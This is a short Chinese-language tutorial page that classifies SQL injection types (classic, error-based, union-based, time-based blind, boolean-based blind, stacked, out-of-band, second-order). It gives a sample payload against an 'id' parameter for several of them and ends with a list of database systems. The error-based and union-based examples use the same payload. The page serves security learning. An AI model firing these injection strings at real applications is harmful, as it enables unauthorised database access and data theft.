# 注入类型

::: warning DeeLMind 推荐
分类只是便于新手学习，学到最后应该九九归一，无所谓什么类型
:::

## 注入类型分类

<DocsAD/>

* In-band SQLi (Classic SQLi)

```SQL
id=4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'JOtO'='JOtO
```

* Error-based SQLi

```SQL
id=-7810' UNION ALL SELECT NULL,CONCAT(0x7171627a71,0x415449484d526167596a77484c6e47775644794b4b7048756b6b47746472536a4c58694471634d65,0x7171787171),NULL--
```

* Union-based SQLi

```SQL
id=-7810' UNION ALL SELECT NULL,CONCAT(0x7171627a71,0x415449484d526167596a77484c6e47775644794b4b7048756b6b47746472536a4c58694471634d65,0x7171787171),NULL--
```

* Time-based Blind SQLi

```SQL
id=4' AND (SELECT 5114 FROM (SELECT(SLEEP(2))) AS RezN) AND 'vULj'='vULj
```

* Boolean-based Blind SQLi

```SQL
id=1' AND 5957=5957 AND 'DFUZ'='DFUZ
```

* Stacked injections

```SQL
;
```

* OOB(Out Of Band)

* 二次注入

## 数据库分类

* DB2
* MySQL
* MongoDB
* Redis
* Oracle
* PostgreSQL
* Microsoft SQL Server
* SQLite
* Cassandra
* CouchDB
* Amazon Aurora
* Google Cloud Spanner
* Firebase Realtime Database
* Apache HBase
* MariaDB
* Amazon DynamoDB
* Apache Cassandra
* Apache Hive
* Apache Phoenix
* Apache Spark SQL
* Apache Derby
* ArangoDB
* CockroachDB
* Couchbase
* Elasticsearch
* InfluxDB
* Neo4j
* OrientDB
* RavenDB
* Riak
* TimescaleDB